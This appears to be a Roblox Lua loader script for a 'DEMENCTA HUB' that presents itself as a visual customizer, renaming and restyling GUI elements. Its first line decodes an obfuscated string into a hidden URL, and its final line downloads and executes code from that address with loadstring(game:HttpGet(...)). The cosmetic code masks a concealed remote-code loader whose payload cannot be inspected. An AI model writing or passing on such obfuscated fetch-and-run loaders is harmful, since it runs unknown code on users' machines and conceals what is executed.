
--[[ STAGE 2: VISUAL CORE ]]
local BEKi9BE2I9ME_T8GHLW5eE="\195\190\222\163\145\233\158\247\180\002\008\190\241\034\035\027\039\068\015\034\253\033\021\047\036\101\083\127\123\119\111\168\151\159\188\184\179\150\167\160\181\239\233\251\251\236\244\236\237\030\015\040\051\067\065\019\037\068\093\075\049\121\125\124\143\084\158\165\159\152\179\178\195\177\200\154\220\204\240\236\255\254\013\008\026\032\040\238\055\060\055\011\060\089\089\081\110\116\111\103\131\116\129\147\143\171\158\184\185\137\183\204\194\164\171\159\221\231\242\249\020"local zGsiizlKKIsPvicykcFWA=147 local tkAicSRV1IfK=190 local RYCtAtxRJf8MQ9zFF5tlr7=0 local dlFOyNZr5YZKT0X=7 local AsEma_M5mHPExHuuWShUGZ=12 local LAvXIwiyx4036U0=true local e58wBTenSsukm5vKPqzUZ=bit32 and bit32.bxor if not e58wBTenSsukm5vKPqzUZ then e58wBTenSsukm5vKPqzUZ=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local SGuHLT5NJ29b2qmiFY5f7f={}for kHxWiy2IVN7jUA481d=1,#BEKi9BE2I9ME_T8GHLW5eE do local uwn0bWYDbIzeI9T1YE4=string.byte(BEKi9BE2I9ME_T8GHLW5eE,kHxWiy2IVN7jUA481d)local gq371LNSexk8z0u=(tkAicSRV1IfK+(kHxWiy2IVN7jUA481d*dlFOyNZr5YZKT0X)+AsEma_M5mHPExHuuWShUGZ)%256 if RYCtAtxRJf8MQ9zFF5tlr7==0 then uwn0bWYDbIzeI9T1YE4=(uwn0bWYDbIzeI9T1YE4-gq371LNSexk8z0u)%256 SGuHLT5NJ29b2qmiFY5f7f[kHxWiy2IVN7jUA481d]=string.char(e58wBTenSsukm5vKPqzUZ(uwn0bWYDbIzeI9T1YE4,zGsiizlKKIsPvicykcFWA))else uwn0bWYDbIzeI9T1YE4=e58wBTenSsukm5vKPqzUZ(uwn0bWYDbIzeI9T1YE4,zGsiizlKKIsPvicykcFWA)SGuHLT5NJ29b2qmiFY5f7f[kHxWiy2IVN7jUA481d]=string.char((uwn0bWYDbIzeI9T1YE4-gq371LNSexk8z0u)%256)end end local uIAVq97T7Abta=table.concat(SGuHLT5NJ29b2qmiFY5f7f)if LAvXIwiyx4036U0 then uIAVq97T7Abta=string.reverse(uIAVq97T7Abta)end local VSpHxHKiefYVH8=uIAVq97T7Abta
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(VSpHxHKiefYVH8))()
